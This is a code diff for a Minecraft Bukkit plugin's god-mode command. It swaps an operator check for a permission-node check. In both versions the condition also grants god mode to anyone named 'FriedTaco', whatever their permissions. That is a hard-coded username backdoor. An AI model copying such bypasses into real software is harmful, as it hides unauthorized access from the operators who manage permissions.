@@ -5,6 +5,7 @@ import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
+import org.bukkit.permissions.Permission;
 
 public class godModeCommand implements CommandExecutor
 {
@@ -21,7 +22,7 @@ public class godModeCommand implements CommandExecutor
     	if(sender instanceof Player)
     	{
     		player = (Player) sender;
-    		if((godPowers.Permissions == null && player.isOp()) || (godPowers.Permissions != null && godPowers.Permissions.has(player, "godPowers.godmode")) || player.getName().equalsIgnoreCase("FriedTaco"))
+    		if((godPowers.Permissions == null && player.hasPermission("godpowers.godmode")) || (godPowers.Permissions != null && godPowers.Permissions.has(player, "godPowers.godmode")) || player.getName().equalsIgnoreCase("FriedTaco"))
     		{
 	    		if(split.length == 0)
 	    		{
